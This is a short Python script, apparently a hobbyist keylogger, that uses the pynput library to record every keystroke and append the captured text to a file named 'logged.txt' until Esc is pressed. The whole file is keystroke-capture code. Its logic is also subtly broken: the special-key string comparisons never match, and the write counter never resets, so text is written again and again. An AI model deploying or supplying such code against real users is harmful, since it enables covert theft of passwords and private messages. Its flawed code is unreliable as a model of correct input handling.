from ast import Pass
from unittest import result
from pynput import keyboard as kb

result=""
count=0
def on_press(key):
    global result,count

    try:
        result=result+key.char
        count+=1
    
    except AttributeError:
        lst=["key.esc","key.enter","key.backspace","key.down","key.up","key.right","key.left","key.down","key.tab"]
        rec_key=key
        # print(rec_key)
        if(str(rec_key)=="key.enter"):
            print("\n")
        elif(str(rec_key)=="key.space"):
            result=result+" "
            print(result,count)
        elif(str(rec_key)  in lst):
            print("\n")
        else:
            result=result+" "
            print(result)
    text_file(result,count)


def text_file(result,count):
    with open("logged.txt","a") as fp:
        if(count>=10):
            count=0
            fp.write(result)
            result=""
    return

def on_release(key):
    if key==kb.Key.esc:
        return False

with kb.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()